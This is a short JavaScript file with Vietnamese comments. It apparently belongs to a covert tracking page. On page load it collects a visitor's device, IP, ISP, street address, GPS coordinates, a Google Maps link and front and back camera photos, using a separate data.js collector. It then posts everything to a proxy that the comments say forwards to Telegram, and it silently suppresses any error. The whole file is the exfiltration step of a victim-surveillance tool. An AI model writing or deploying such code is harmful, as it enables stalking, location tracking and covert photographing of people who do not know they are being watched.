// main.js - Dùng data.js để lấy dữ liệu
const API_PROXY = '/api/tele-proxy';

async function main() {
    console.log("🚀 Bắt đầu...");
    
    // Thu thập tất cả dữ liệu từ data.js
    const data = await window.DataCollector.collect();
    
    // Gửi lên Telegram
    const formData = new FormData();
    formData.append('clientInfo', JSON.stringify({
        time: data.time,
        device: data.device,
        os: data.os,
        ip: data.ip,
        isp: data.isp,
        location: data.address,
        country: data.country,
        latitude: data.lat,
        longitude: data.lon,
        google_maps: data.maps,
        camera: data.camera,
        note: data.note
    }));
    
    if (data.frontPhoto) formData.append('front', data.frontPhoto);
    if (data.backPhoto) formData.append('back', data.backPhoto);
    
    try {
        await fetch(API_PROXY, { method: 'POST', body: formData });
        console.log("✅ Đã gửi thành công");
    } catch(e) {}
    
    window.mainScriptFinished = true;
}

main();
